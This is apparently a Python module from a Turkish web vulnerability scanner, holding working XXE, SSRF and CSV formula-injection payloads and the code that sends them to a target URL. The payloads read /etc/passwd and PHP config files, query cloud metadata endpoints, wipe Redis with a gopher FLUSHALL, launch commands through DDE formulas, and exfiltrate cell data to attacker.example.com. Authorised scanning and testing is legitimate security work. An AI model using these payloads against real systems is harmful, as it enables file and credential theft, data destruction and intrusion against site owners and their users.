"""
xxe_ssrf_injection.py — VIRELOX v4.0 XXE, SSRF ve CSV Formula Injection
Mozilla Public License 2.0 — AltayHR Developers
"""

import re
import urllib.parse
from typing import List


class XXEInjection:
    TIP_ADI = "xxe"

    _XXE_KLASIK = [
        ('<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
         '<test>&xxe;</test>'),
        ('<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>'
         '<test>&xxe;</test>'),
        ('<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///proc/version">]>'
         '<test>&xxe;</test>'),
        ('<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>'
         '<test>&xxe;</test>'),
        ('<?xml version="1.0" encoding="UTF-8"?>'
         '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>'),
    ]

    _XXE_PHP_WRAPPER = [
        ('<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM '
         '"php://filter/convert.base64-encode/resource=index.php">]><test>&xxe;</test>'),
        ('<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM '
         '"php://filter/convert.base64-encode/resource=config.php">]><test>&xxe;</test>'),
    ]

    _XXE_BLIND = [
        ('<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % dtd SYSTEM '
         '"http://attacker.example.com/xxe.dtd">%dtd;]><data>test</data>'),
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM '
         '"http://attacker.example.com/evil.dtd"> %xxe;]><foo>test</foo>'),
    ]

    _XXE_SVG = [
        ('<?xml version="1.0" standalone="yes"?><!DOCTYPE test [<!ENTITY xxe SYSTEM '
         '"file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'),
    ]

    def __init__(self, http_istemci, log_func=None, payload_log_func=None):
        self.http = http_istemci
        self.log  = log_func or (lambda m: None)
        self.plog = payload_log_func or log_func or (lambda m: None)

    def _yazi(self, yanit) -> str:
        return getattr(yanit, "text", "") if yanit else ""

    def test(self, url, param, post_data=None) -> dict:
        self.log("[XXE] XXE injection deneniyor (klasik + PHP wrapper + blind)...")
        headers_xml = {"Content-Type": "application/xml"}

        tum = self._XXE_KLASIK + self._XXE_PHP_WRAPPER
        for i, p in enumerate(tum, 1):
            self.plog(f"[XXE] [{i}/{len(tum)}] → {p[:60]}…")
            try:
                y = self.http.post(url, data=p.encode(), headers=headers_xml)
                icerik = self._yazi(y)
                if re.search(r"root:x:|linux.*kernel|\[boot loader\]|bin/bash",
                             icerik, re.IGNORECASE):
                    return {"basarili": True, "payload": p, "dbms": "XXE",
                            "detay": f"Dosya içeriği sızdırıldı: {icerik[:80]}"}
                if re.search(r"[A-Za-z0-9+/]{20,}={0,2}", icerik) and "wrapper" in p:
                    import base64
                    m = re.search(r"([A-Za-z0-9+/]{20,}={0,2})", icerik)
                    if m:
                        try:
                            decoded = base64.b64decode(m.group(1)).decode("utf-8", errors="replace")
                            if "<?php" in decoded or "mysql" in decoded.lower():
                                return {"basarili": True, "payload": p, "dbms": "XXE",
                                        "detay": f"PHP dosyası base64 decode: {decoded[:80]}"}
                        except Exception:
                            pass
            except Exception:
                pass

        return {"basarili": False, "payload": "", "dbms": "", "detay": ""}

    def veri_al(self, url, param, sorgu, post_data=None) -> str:
        return ""

    def tablolari_al(self, url, param, db, post_data=None) -> list:
        return []

    def kolonlari_al(self, url, param, tablo, db, post_data=None) -> list:
        return []

    def tablo_verisi_cek(self, url, param, tablo, kolonlar, post_data=None) -> list:
        return []


class SSRFInjection:
    TIP_ADI = "ssrf"

    _SSRF_PAYLOADLAR = [
        "http://127.0.0.1:80/",
        "http://localhost:80/",
        "http://127.0.0.1:8080/admin",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/instance-id",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/",
        "http://192.168.0.1/",
        "http://10.0.0.1/",
        "file:///etc/passwd",
        "file:///etc/hostname",
        "file:///proc/self/environ",
        "dict://127.0.0.1:11211/stat",
        "gopher://127.0.0.1:6379/_%2a1%0d%0a%248%0d%0aFLUSHALL%0d%0a",
        "sftp://attacker.example.com:11111/",
        "ldap://127.0.0.1:389/%0astats%0aquit",
        "ftp://127.0.0.1:21/",
        "jar:http://attacker.example.com/jar.jar!/",
        "http://0.0.0.0:80/",
        "http://[::1]:80/",
    ]

    def __init__(self, http_istemci, log_func=None, payload_log_func=None):
        self.http = http_istemci
        self.log  = log_func or (lambda m: None)
        self.plog = payload_log_func or log_func or (lambda m: None)

    def _yazi(self, yanit) -> str:
        return getattr(yanit, "text", "") if yanit else ""

    def _url_hazirla(self, url, param, payload):
        p = urllib.parse.urlparse(url)
        params = dict(urllib.parse.parse_qsl(p.query))
        params[param] = payload
        return urllib.parse.urlunparse((p.scheme, p.netloc, p.path, "",
                                         urllib.parse.urlencode(params), ""))

    def test(self, url, param, post_data=None) -> dict:
        self.log(f"[SSRF] {len(self._SSRF_PAYLOADLAR)} SSRF payload deneniyor...")
        ref = self._yazi(self.http.get(url))
        ref_len = len(ref)

        for i, p in enumerate(self._SSRF_PAYLOADLAR, 1):
            if i % 5 == 1:
                self.plog(f"[SSRF] [{i}/{len(self._SSRF_PAYLOADLAR)}] → {p[:60]}")
            try:
                if post_data is not None:
                    pd = dict(post_data) if isinstance(post_data, dict) else {}
                    pd[param] = p
                    y = self.http.post(url, data=pd)
                else:
                    y = self.http.get(self._url_hazirla(url, param, p))
                icerik = self._yazi(y)

                if re.search(r"root:x:|ami-id|hostname|computeMetadata", icerik, re.IGNORECASE):
                    return {"basarili": True, "payload": p, "dbms": "SSRF",
                            "detay": f"İç kaynak erişildi: {icerik[:80]}"}
                if abs(len(icerik) - ref_len) > 200:
                    return {"basarili": True, "payload": p, "dbms": "SSRF",
                            "detay": f"Farklı yanıt boyutu: {len(icerik)} vs {ref_len}"}
            except Exception:
                pass

        return {"basarili": False, "payload": "", "dbms": "", "detay": ""}

    def veri_al(self, url, param, sorgu, post_data=None) -> str:
        return ""

    def tablolari_al(self, url, param, db, post_data=None) -> list:
        return []

    def kolonlari_al(self, url, param, tablo, db, post_data=None) -> list:
        return []

    def tablo_verisi_cek(self, url, param, tablo, kolonlar, post_data=None) -> list:
        return []


class CSVFormulaInjection:
    TIP_ADI = "csv_formula"

    _PAYLOADLAR = [
        "=CMD|' /C calc'!A0",
        "=HYPERLINK(\"http://attacker.example.com\",\"click\")",
        "@SUM(1+1)*cmd|' /C calc'!A0",
        "=DDE(\"cmd\",\"/C calc\",\"\")",
        "-2+3+cmd|' /C calc'!A0",
        "+cmd|' /C calc'!A0",
        "|calc.exe",
        "\"=IMPORTXML(CONCAT(\"\"http://attacker.example.com/?x=\"\",CONCATENATE(A2:E2)),\"\"//a\"\")\"",
        "=WEBSERVICE(\"http://attacker.example.com\")",
        "=IMPORTDATA(\"http://attacker.example.com\")",
    ]

    def __init__(self, http_istemci, log_func=None, payload_log_func=None):
        self.http = http_istemci
        self.log  = log_func or (lambda m: None)
        self.plog = payload_log_func or log_func or (lambda m: None)

    def test(self, url, param, post_data=None) -> dict:
        self.log("[CSV-FORMULA] CSV/Formula injection deneniyor...")
        for i, p in enumerate(self._PAYLOADLAR, 1):
            self.plog(f"[CSV] [{i}/{len(self._PAYLOADLAR)}] → {p[:50]}")
            # Bu injection'ın başarısı genellikle CSV export'ta görülür
            # Burada sadece payload'ı forma gönderip yanıtı kaydediyoruz
            try:
                if post_data is not None:
                    pd = dict(post_data) if isinstance(post_data, dict) else {}
                    pd[param] = p
                    y = self.http.post(url, data=pd)
                    if y and getattr(y, "status_code", 0) == 200:
                        return {"basarili": True, "payload": p, "dbms": "CSV",
                                "detay": "Payload kabul edildi — CSV export'u kontrol edin"}
            except Exception:
                pass
        return {"basarili": False, "payload": "", "dbms": "", "detay": ""}

    def veri_al(self, url, param, sorgu, post_data=None) -> str:
        return ""

    def tablolari_al(self, url, param, db, post_data=None) -> list:
        return []

    def kolonlari_al(self, url, param, tablo, db, post_data=None) -> list:
        return []

    def tablo_verisi_cek(self, url, param, tablo, kolonlar, post_data=None) -> list:
        return []
